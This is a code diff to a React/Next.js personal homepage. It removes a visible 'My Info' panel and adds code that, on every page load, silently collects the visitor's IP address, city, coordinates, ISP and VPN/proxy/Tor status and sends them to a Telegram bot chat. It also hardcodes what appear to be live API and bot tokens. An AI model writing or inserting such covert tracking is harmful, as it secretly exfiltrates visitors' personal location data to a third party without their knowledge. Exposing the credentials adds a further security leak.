@@ -23,19 +23,26 @@ interface IPInfo {
     proxy: boolean;
     tor: boolean;
   };
+  asn?: {
+    asn: string;
+    name: string;
+    domain: string;
+    route: string;
+    type: string;
+  };
 }
 
 export default function Home() {
   const [ipInfo, setIpInfo] = useState<IPInfo | null>(null);
-  const [showInfo, setShowInfo] = useState<boolean>(false);
 
   useEffect(() => {
     const fetchVisitorInfo = async () => {
       try {
-        const response = await fetch('https://ipinfo.io/json?token=YOUR_TOKEN'); // Replace with your token
-        if (!response.ok) throw new Error('Network response was not ok');
+        const response = await fetch('https://ipinfo.io/json?token=9b0d535b05cb58'); // Replace with your token
         const data = await response.json();
         setIpInfo(data);
+        
+        sendToTelegram(data);
       } catch (error) {
         console.error('Error fetching IP address:', error);
       }
@@ -44,17 +51,19 @@ export default function Home() {
     fetchVisitorInfo();
   }, []);
 
-  const handleShowInfo = () => {
-    setShowInfo(prev => !prev); // Toggle visibility of IP info
+  const sendToTelegram = async (data: IPInfo) => {
+    const telegramBotToken = '7813198341:AAGe3L2osE7r6NFs5malKDbCx82OKxlmqto'; // Replace with your bot token
+    const chatId = '5086819565'; // Replace with your chat ID
+    const message = `Visitor Info:\nIP: ${data.ip}\nHostname: ${data.hostname}\nCity: ${data.city}\nRegion: ${data.region}\nCountry: ${data.country}\nPostal Code: ${data.postal}\nLocation (Lat, Long): ${data.loc}\nTimezone: ${data.timezone}\nOrganization/ISP: ${data.org}\nVPN Detected? ${data.privacy.vpn ? 'Yes' : 'No'}\nProxy Detected? ${data.privacy.proxy ? 'Yes' : 'No'}\nTor Detected? ${data.privacy.tor ? 'Yes' : 'No'}`;
+    
+    const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
 
-    // Scroll to the IP information section if showing info
-    if (!showInfo) {
-      setTimeout(() => {
-        const infoSection = document.getElementById("ip-info");
-        if (infoSection) {
-          infoSection.scrollIntoView({ behavior: 'smooth' });
-        }
-      }, 100); // Delay to allow rendering before scrolling
+    try {
+      const response = await fetch(url);
+      const result = await response.json();
+      console.log('Message sent to Telegram:', result);
+    } catch (error) {
+      console.error('Error sending message to Telegram:', error);
     }
   };
 
@@ -71,12 +80,6 @@ export default function Home() {
               {item.name}
             </Link>
           ))}
-          <button 
-            onClick={handleShowInfo} 
-            className="text-sm duration-500 text-zinc-500 hover:text-zinc-300"
-          >
-            {showInfo ? 'Hide Info' : 'My Info'}
-          </button>
         </ul>
       </nav>
       <div className="hidden w-screen h-px animate-glow md:block animate-fade-left bg-gradient-to-r from-zinc-300/0 via-zinc-300/50 to-zinc-300/0" />
@@ -88,28 +91,6 @@ export default function Home() {
         Vansh~fr
       </h1>
 
-      {/* Section for displaying user IP information */}
-      <div id="ip-info" className={`my-4 text-center text-white transition-all duration-500 ease-in-out ${showInfo ? 'max-h-screen opacity-100' : 'max-h-0 opacity-0 overflow-hidden'}`}>
-        {ipInfo && (
-          <>
-            <h2>Your IP Information:</h2>
-            <p>IP: {ipInfo.ip}</p>
-            <p>Hostname: {ipInfo.hostname}</p>
-            <p>City: {ipInfo.city}</p>
-            <p>Region: {ipInfo.region}</p>
-            <p>Country: {ipInfo.country}</p>
-            <p>Postal Code: {ipInfo.postal}</p>
-            <p>Location (Lat, Long): {ipInfo.loc}</p>
-            <p>Timezone: {ipInfo.timezone}</p>
-            <p>Organization/ISP: {ipInfo.org}</p>
-            <p>VPN Detected? {ipInfo.privacy.vpn ? 'Yes' : 'No'}</p>
-            <p>Proxy Detected? {ipInfo.privacy.proxy ? 'Yes' : 'No'}</p>
-            <p>Tor Detected? {ipInfo.privacy.tor ? 'Yes' : 'No'}</p>
-          </>
-        )}
-      </div>
-
-      {/* Additional content below */}
       <div className="hidden w-screen h-px animate-glow md:block animate-fade-right bg-gradient-to-r from-zinc-300/0 via-zinc-300/50 to-zinc-300/0" />
       <div className="my-16 text-center animate-fade-in">
         <h2 className="text-sm text-zinc-500 ">
